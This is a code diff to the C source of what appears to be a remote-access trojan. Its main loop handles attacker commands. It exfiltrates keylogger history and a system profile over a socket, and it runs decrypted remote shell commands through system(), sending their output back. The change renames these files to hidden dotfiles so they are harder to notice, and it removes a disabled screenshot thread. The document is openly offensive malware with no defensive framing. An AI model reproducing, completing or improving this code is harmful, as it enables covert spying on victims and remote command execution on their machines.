@@ -41,7 +41,7 @@ int main (){
 		switch (attacker_income_action){
 			case GET_KEYLOGGER_HISTORY :
 				
-				send_file("keylogger.txt", GET_KEYLOGGER_HISTORY, true);
+				send_file(".keylogger.txt", GET_KEYLOGGER_HISTORY, true);
 				
 				break;
 				
@@ -69,17 +69,17 @@ int main (){
 				
 			case GET_SYSTEM_PROFILER :
 				get_system_profiler();
-				send_file("system_profiler.txt", GET_SYSTEM_PROFILER, true);
+				send_file(".system_profiler.txt", GET_SYSTEM_PROFILER, true);
 				
 				break;
 				
 			case SEND_BIND_SHELL_COMMAND :
 				recv(V_S_socket, bind_shell_command, ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND), 0);
-				sprintf(bind_shell_command, "%s > shell_command_output.txt", decrypt_text(bind_shell_command, AES_KEY)); // set the shell_command_output to spasipic path!! !!!1
+				sprintf(bind_shell_command, "%s > .shell_command_output.txt", decrypt_text(bind_shell_command, AES_KEY)); // set the shell_command_output to spasipic path!! !!!1
 				puts(bind_shell_command);
 				fflush(stdout);
 				system(bind_shell_command);
-				send_file("shell_command_output.txt", SEND_BIND_SHELL_COMMAND, false);
+				send_file(".shell_command_output.txt", SEND_BIND_SHELL_COMMAND, false);
 				
 				break;
 				
@@ -93,9 +93,4 @@ int main (){
 				break;
 		}
 	}
-	
-////	pthread_t screenshot_thread;
-////	pthread_create(&screenshot_thread, NULL, start_screen_capture, NULL); 
-////	pthread_join(screenshot_thread, NULL); 
-////	int pthread_cancel(pthread_t thread); // kill the thread we dont use, if u want to use it
 }
